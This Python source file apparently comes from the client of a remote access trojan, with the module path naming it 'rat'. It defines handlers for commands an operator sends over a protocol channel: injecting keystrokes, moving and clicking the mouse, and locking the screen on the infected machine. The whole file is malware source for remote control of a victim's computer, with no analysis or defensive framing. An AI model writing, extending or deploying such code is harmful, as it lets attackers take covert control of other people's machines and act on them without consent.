from client.commands.base import Command


class KeystrokeCommand(Command):
    name = 'keystroke'

    def execute(self, ctx, raw: str):
        text = raw[10:].strip()
        if not text:
            ctx.protocol.send('[-] Usage: keystroke <text to type>')
            return True
        from client.modules.rat.control import inject_keystroke
        ctx.protocol.send(inject_keystroke(text))
        return True


class MouseCommand(Command):
    name = 'mouse'

    def execute(self, ctx, raw: str):
        args = raw[6:].strip().split()
        if len(args) < 2:
            ctx.protocol.send('[-] Usage: mouse <x> <y>')
            return True
        try:
            from client.modules.rat.control import move_mouse
            x, y = int(args[0]), int(args[1])
            ctx.protocol.send(move_mouse(x, y))
        except ValueError:
            ctx.protocol.send('[-] X and Y must be integers')
        return True


class ClickCommand(Command):
    name = 'click'

    def execute(self, ctx, raw: str):
        button = raw[6:].strip() or 'left'
        from client.modules.rat.control import click_mouse
        ctx.protocol.send(click_mouse(button))
        return True


class LockScreenCommand(Command):
    name = 'lock_screen'

    def execute(self, ctx, raw: str):
        from client.modules.rat.control import lock_screen
        ctx.protocol.send(lock_screen())
        return True
